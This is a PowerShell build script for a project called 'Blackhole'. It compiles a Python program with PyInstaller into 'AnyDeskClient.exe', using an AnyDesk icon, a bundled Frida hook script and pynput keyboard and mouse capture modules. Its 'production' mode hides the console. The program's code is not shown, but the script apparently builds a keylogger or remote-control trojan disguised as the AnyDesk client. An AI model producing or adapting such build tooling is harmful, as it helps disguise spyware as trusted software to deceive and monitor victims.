# Blackhole Build Script
param([switch]$Dev)

# Configuration variables
$ExeName = "AnyDeskClient.exe"
$ExeBaseName = "AnyDeskClient"  # Name without .exe extension (for PyInstaller --name)

Write-Host ""
Write-Host "========================================"
Write-Host "  Blackhole - Build"
Write-Host "========================================"
Write-Host ""

$venvPath = "venv"
$venvPython = "$venvPath\Scripts\python.exe"
$venvPip = "$venvPath\Scripts\pip.exe"

# Step 1: Virtual Environment
if (-not (Test-Path $venvPath)) {
    Write-Host "Creating virtual environment..."
    python -m venv $venvPath
    if ($LASTEXITCODE -ne 0) {
        Write-Host "ERROR: Failed to create virtual environment"
        Read-Host "Press Enter to exit"
        exit 1
    }
    Write-Host "Virtual environment created"
} else {
    Write-Host "Virtual environment found"
}
Write-Host ""

# Step 2: Install Requirements
Write-Host "Installing requirements..."
Write-Host ""
Write-Host "Upgrading pip:"
& $venvPip install --upgrade pip
if ($LASTEXITCODE -ne 0) {
    Write-Host "Warning: Pip upgrade failed (Windows file lock - this is OK)"
}

Write-Host ""
Write-Host "Installing packages:"
& $venvPip install -r requirements.txt
if ($LASTEXITCODE -ne 0) {
    Write-Host "ERROR: Failed to install requirements"
    Read-Host "Press Enter to exit"
    exit 1
}

Write-Host ""
Write-Host "Verifying PyInstaller..."
& $venvPython -c "import PyInstaller" 2>$null
if ($LASTEXITCODE -ne 0) {
    Write-Host "ERROR: PyInstaller not found"
    Read-Host "Press Enter to exit"
    exit 1
}
Write-Host "All requirements installed"
Write-Host ""

# Step 3: Clean Previous Builds
Write-Host "Cleaning previous builds..."
if (Test-Path "dist") { Remove-Item -Recurse -Force "dist" }
if (Test-Path "build") { Remove-Item -Recurse -Force "build" }
$specFile = "$ExeBaseName.spec"
if (Test-Path $specFile) { Remove-Item -Force $specFile }
Write-Host "Build directories cleaned"
Write-Host ""

# Step 4: Build
if ($Dev) {
    Write-Host "Building DEV mode with console"
    Write-Host ""
    & $venvPython -m PyInstaller --onefile --console --name $ExeBaseName --icon assets/AnyDeskOrange.ico --add-data "utils/frida_hook.js;utils" --add-data "assets;assets" --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32 main.py
    
    if ($LASTEXITCODE -ne 0) {
        Write-Host ""
        Write-Host "ERROR: Build failed"
        Read-Host "Press Enter to exit"
        exit 1
    }
    
    Write-Host ""
    Write-Host "Creating dev mode marker..."
    New-Item -ItemType File -Path "dist\.dev_mode" -Force | Out-Null
    Write-Host "Dev mode marker created"
    
    Write-Host ""
    Write-Host "========================================"
    Write-Host "  Build Complete - DEV MODE"
    Write-Host "========================================"
    Write-Host ""
    Write-Host "Output: dist\$ExeName"
    Write-Host "Marker: dist\.dev_mode"
    Write-Host "Console: VISIBLE"
    Write-Host ""
    Write-Host "Install: .\install.ps1 -Dev"
    Write-Host ""
} else {
    Write-Host "Building PRODUCTION mode headless"
    Write-Host ""
    & $venvPython -m PyInstaller --onefile --noconsole --name $ExeBaseName --icon assets/AnyDeskOrange.ico --add-data "utils/frida_hook.js;utils" --add-data "assets;assets" --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32 main.py
    
    if ($LASTEXITCODE -ne 0) {
        Write-Host ""
        Write-Host "ERROR: Build failed"
        Read-Host "Press Enter to exit"
        exit 1
    }
    
    if (Test-Path "dist\.dev_mode") {
        Remove-Item "dist\.dev_mode" -Force
        Write-Host ""
        Write-Host "Removed dev mode marker"
    }
    
    Write-Host ""
    Write-Host "========================================"
    Write-Host "  Build Complete - PRODUCTION"
    Write-Host "========================================"
    Write-Host ""
    Write-Host "Output: dist\$ExeName"
    Write-Host "Console: HIDDEN"
    Write-Host ""
    Write-Host "Install: .\install.ps1"
    Write-Host ""
}

Read-Host "Press Enter to exit"
